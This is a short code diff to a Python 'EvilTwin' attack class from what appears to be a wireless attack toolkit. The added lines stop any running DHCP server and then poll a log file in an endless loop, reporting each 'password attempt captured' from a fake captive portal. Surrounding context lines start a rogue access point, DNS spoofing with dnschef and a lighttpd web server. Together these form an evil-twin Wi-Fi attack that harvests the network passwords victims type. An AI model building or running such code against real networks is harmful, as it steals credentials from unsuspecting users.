@@ -22,6 +22,9 @@ class EvilTwin(AbstractAttack):
         target = kwargs['target']
         interface = kwargs['interface']
 
+        cmd = ['killall', 'dhcpd']
+        sb.run(cmd)
+
         airbase_t = Thread(daemon=True, target=cls.create_AP, args=(q, target, interface))
         dnschef_t = Thread(daemon=True, target=cls.init_dnschef, args=(q, ))
         lighttpd_t = Thread(daemon=True, target=cls.init_lighttpd, args=(q,))
@@ -38,6 +41,19 @@ class EvilTwin(AbstractAttack):
         cls.init_dhcpd()
         dnschef_t.start()
         lighttpd_t.start()
+
+        data = []
+        file_position = 0
+
+        while True:
+            with open('www/ag.et_attempts.txt', 'r') as f:
+                f.seek(file_position)  # fast forward beyond content read previously
+                for line in f:
+                    q.put('Password attempt captured!\n')
+                    q.put(line)
+
+                file_position = f.tell()  # store position at which to resume
+
 
     @classmethod
     def create_AP(cls, q, target, interface):
